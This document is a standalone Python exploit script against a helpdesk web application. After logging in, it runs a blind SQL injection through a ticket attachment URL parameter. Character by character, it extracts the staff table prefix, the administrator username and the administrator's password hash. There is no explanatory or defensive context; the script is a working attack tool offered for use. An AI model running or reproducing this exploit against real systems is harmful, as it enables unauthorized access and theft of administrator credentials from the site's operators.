import requests
import sys

if( len(sys.argv) < 3):
	print "put proper data like in example, remember to open a ticket before.... "
	print "python helpdesk.py http://192.168.43.162/helpdesk/ myemailtologin@gmail.com password123"
	exit()
EMAIL = sys.argv[2]
PASSWORD = sys.argv[3]

URL = sys.argv[1]

def get_token(content):
	token = content
	if "csrfhash" not in token:
		return "error"
	token = token[token.find('csrfhash" value="'):len(token)]
	if '" />' in token:
		token = token[token.find('value="')+7:token.find('" />')] 
	else:
		token = token[token.find('value="')+7:token.find('"/>')] 
	return token

def get_ticket_id(content):
	ticketid = content
	if "param[]=" not in ticketid:
                return "error"
	ticketid = ticketid[ticketid.find('param[]='):len(ticketid)]
	ticketid = ticketid[8:ticketid.find('"')]
	return ticketid


def main():

    # Start a session so we can have persistant cookies
	session = requests.session()
        print URL
	r = session.get(URL+"")
	
	#GET THE TOKEN TO LOGIN
        TOKEN = get_token(r.content)
	if(TOKEN=="error"):
		print "cannot find token"
		exit();
    #Data for login 
	login_data = {
		'do': 'login',
		'csrfhash': TOKEN,
		'email': EMAIL,
		'password': PASSWORD,
		'btn': 'Login'
	}

    # Authenticate
	r = session.post(URL+"/?v=login", data=login_data)
    #GET  ticketid
	ticket_id = get_ticket_id(r.content)
        print "ticket_id:"
        print ticket_id
        if(ticket_id=="error"):
                print "ticketid not found, open a ticket first"
		exit()
	target = URL +"?v=view_tickets&action=ticket&param[]="+ticket_id+"&param[]=attachment&param[]=1&param[]=1"

	limit = 1
        char = 47
        prefix=[]
        while(char!=123):
                target_prefix = target+ " or 1=1 and ascii(substr((SeLeCt table_name from information_schema.columns where table_name like '%staff'  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
                response = session.get(target_prefix).content
                print response
                if "couldn't find" not in response:
                        prefix.append(char)
                        limit=limit+1
                        char=47
                else:
                        char=char+1
	table_prefix = ''.join(chr(i) for i in prefix)
	table_prefix = table_prefix[0:table_prefix.find('staff')]
	
	limit = 1
	char = 47
	admin_u=[]
	while(char!=123):
		target_username = target+ " or 1=1 and ascii(substr((SeLeCt username from "+table_prefix+"staff  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
		response = session.get(target_username).content
		if "couldn't find" not in response:
			admin_u.append(char)
			limit=limit+1
			char=47
		else:
			char=char+1

        limit = 1
        char = 47
        admin_pw=[]
        while(char!=123):
                target_password = target+ " or 1=1 and ascii(substr((SeLeCt password from "+table_prefix+"staff  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
                response = session.get(target_password).content
                if "couldn't find" not in response:
                        admin_pw.append(char)
                        limit=limit+1
                        char=47
                else:
                        char=char+1


	admin_username = ''.join(chr(i) for i in admin_u)
	admin_password = ''.join(chr(i) for i in admin_pw)

	print "------------------------------------------"
	print "username: "+admin_username
	print "password: sha256("+admin_password+")"
	if admin_username==""  and  admin_password=='':
		print "Your ticket have to include attachment, probably none atachments found, or prefix is not equal hdz_"
		print "try to submit ticket with attachment"
if __name__ == '__main__':
    main()
